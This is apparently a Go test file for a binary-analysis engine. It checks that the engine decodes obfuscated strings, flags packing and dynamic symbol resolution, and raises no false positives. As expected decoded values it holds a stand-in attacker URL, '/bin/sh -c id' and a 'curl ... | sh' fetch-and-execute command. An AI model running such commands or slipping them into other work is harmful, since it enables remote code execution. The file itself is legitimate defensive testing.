package engine

import (
	"context"
	"strings"
	"testing"

	"github.com/Yanliangchan/unpackr/pkg/models"
	"github.com/Yanliangchan/unpackr/tests/fixtures"
)

func analyse(t *testing.T, path string) *models.Analysis {
	t.Helper()
	rep, err := Analyze(context.Background(), path, opts())
	if err != nil {
		t.Fatal(err)
	}
	if rep.Analysis == nil {
		t.Fatal("no analysis")
	}
	return rep.Analysis
}

func recovered(a *models.Analysis, method, text string) bool {
	for _, d := range a.Decoded {
		if d.Method == method && d.Text == text {
			return true
		}
	}
	return false
}

func hasIndicator(a *models.Analysis, typ, value string) bool {
	for _, i := range a.Indicators {
		if i.Type == typ && i.Value == value {
			return true
		}
	}
	return false
}

func hasSignal(a *models.Analysis, id string) bool {
	for _, s := range a.Packing.Signals {
		if s.ID == id {
			return true
		}
	}
	return false
}

func TestObfuscationCorpus(t *testing.T) {
	const url = "http://evil.example.net/payload"

	t.Run("xor strings in read-only data", func(t *testing.T) {
		a := analyse(t, fixtures.EncodedStaticStrings(t, "xor", 0x5a))
		if !recovered(a, "xor", url) || !recovered(a, "xor", "/bin/sh -c id") {
			t.Fatalf("not recovered: %+v", a.Decoded)
		}
		if !hasIndicator(a, "url", url) {
			t.Errorf("decoded URL missing from indicators: %+v", a.Indicators)
		}
		if a.Packing.State != models.PackObfuscated || a.Packing.Confidence != models.ConfidenceHigh {
			t.Errorf("state %s/%s: %s", a.Packing.State, a.Packing.Confidence, a.Packing.Rationale)
		}
	})
	t.Run("add strings in read-only data", func(t *testing.T) {
		a := analyse(t, fixtures.EncodedStaticStrings(t, "add", 0x13))
		if !recovered(a, "add", url) {
			t.Fatalf("not recovered: %+v", a.Decoded)
		}
	})
	t.Run("xor strings built on the stack", func(t *testing.T) {
		a := analyse(t, fixtures.EncodedStackStrings(t, 0x6b))
		if !recovered(a, "xor", url) {
			t.Fatalf("not recovered: %+v", a.Decoded)
		}
		if a.Packing.State != models.PackObfuscated {
			t.Errorf("state %s", a.Packing.State)
		}
	})
	t.Run("plain stack string", func(t *testing.T) {
		a := analyse(t, fixtures.PlainStackString(t))
		if !recovered(a, "stack", "curl -s http://10.9.8.7/x|sh") {
			t.Fatalf("not recovered: %+v", a.Decoded)
		}
		if a.Packing.Confidence == models.ConfidenceHigh && a.Packing.State == models.PackObfuscated {
			t.Errorf("pattern-matched stack text must not reach high confidence: %+v", a.Packing)
		}
	})
	t.Run("run-time symbol resolution alone", func(t *testing.T) {
		a := analyse(t, fixtures.DynamicResolveOnly(t))
		found := false
		for _, c := range a.Capabilities {
			found = found || c.ID == "evasion.dynamic-resolve"
		}
		if !found {
			t.Errorf("dlsym not reported: %+v", a.Capabilities)
		}
		if a.Packing.State == models.PackObfuscated || a.Packing.State == models.PackLikely || a.Packing.State == models.PackConfirmed {
			t.Errorf("dlsym alone must not make a file look packed: %s", a.Packing.State)
		}
	})
	t.Run("encrypted overlay is suspicious but not a verdict", func(t *testing.T) {
		a := analyse(t, fixtures.WithEncryptedOverlay(t, fixtures.CleanProgram(t), 64<<10))
		if !hasSignal(a, "pack.entropy.overlay") {
			t.Fatalf("overlay not noticed: %+v", a.Packing)
		}
		if a.Packing.State != models.PackUnknown {
			t.Errorf("entropy alone must stay 'unknown', got %s", a.Packing.State)
		}
	})
	t.Run("UPX with markers stripped", func(t *testing.T) {
		packed := fixtures.PackWithUPX(t, fixtures.CleanProgram(t))
		a := analyse(t, fixtures.StripUPXMarkers(t, packed))
		if a.Packing.State != models.PackLikely {
			t.Fatalf("state %s (%s): %+v", a.Packing.State, a.Packing.Rationale, a.Packing.Signals)
		}
		if a.Packing.Family != "" {
			t.Errorf("no family can be named without the markers, got %q", a.Packing.Family)
		}
		if !hasSignal(a, "pack.elf.expanding-segment") {
			t.Errorf("structural signal missing: %+v", a.Packing.Signals)
		}
	})
	t.Run("clean program is left alone", func(t *testing.T) {
		a := analyse(t, fixtures.CleanProgram(t))
		if len(a.Decoded) != 0 || a.Packing.State != models.PackUnpacked {
			t.Errorf("false positive: %d decoded, state %s", len(a.Decoded), a.Packing.State)
		}
		for _, f := range []string{"obfuscation"} {
			for _, s := range a.Packing.Signals {
				if strings.Contains(s.ID, f) {
					t.Errorf("unexpected signal %s", s.ID)
				}
			}
		}
	})
}
